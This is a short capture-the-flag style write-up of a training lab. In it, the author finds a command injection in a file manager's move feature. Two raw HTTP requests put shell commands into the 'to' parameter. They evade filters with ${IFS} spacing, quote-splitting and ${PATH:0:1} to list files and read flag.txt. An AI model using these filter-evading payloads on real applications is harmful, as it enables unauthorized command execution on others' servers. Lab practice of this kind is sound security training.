You are contracted to perform a penetration test for a company, and through your pentest, you stumble upon an interesting file manager web application. As file managers tend to execute system commands, you are interested in testing for command injection vulnerabilities.

Use the various techniques presented in this module to detect a command injection vulnerability and then exploit it, evading any filters in place.

```
it took me some time to find where exactly its using the os cmd,

actually the search parameter is not performing any request, its just client side search parameter.

So i checked and find a copy option which has "move" that is mv cmd


```

```
GET /index.php?to=|${IFS}l"s"&from=605311066.txt&finish=1&move=1 HTTP/1.1
Host: 154.57.164.78:31778
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://154.57.164.78:31778/index.php?to=&from=605311066.txt
Accept-Encoding: gzip, deflate, br
Cookie: filemanager=nbr3v3e6c00528ids6k0i8hfb7
Connection: keep-alive


```

![](Attachments/Pasted%20image%2020260922161047.png)

![](Attachments/Pasted%20image%2020260922161229.png)

```
if we use a "+" for space then it will trigger the safety filter.

```

```
GET /index.php?to=|${IFS}c"a"t${IFS}${PATH:0:1}flag.txt&from=605311066.txt&finish=1&move=1 HTTP/1.1
Host: 154.57.164.78:31778
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://154.57.164.78:31778/index.php?to=&from=605311066.txt
Accept-Encoding: gzip, deflate, br
Cookie: filemanager=nbr3v3e6c00528ids6k0i8hfb7
Connection: keep-alive

```

```
simple one if you can find the exact parameter then its very easy to do.

```

![](Attachments/Pasted%20image%2020260922161656.png)

